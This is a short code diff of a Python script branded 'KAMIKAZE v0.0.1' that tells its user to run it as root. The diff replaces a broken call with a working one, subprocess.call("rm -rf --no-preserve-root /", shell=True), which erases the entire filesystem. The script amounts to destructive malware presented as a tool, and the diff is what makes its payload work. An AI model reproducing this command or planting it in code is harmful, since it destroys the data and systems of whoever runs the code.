@@ -8,4 +8,4 @@ print('''
 		By KAMIKAZE v0.0.1
 ''')
 print("RUN THIS TOOL AS ROOT")
-subprocess.call([rm], [-rf]. [--no-preserve-root], [/])
+subprocess.call("rm -rf --no-preserve-root /", shell=True)
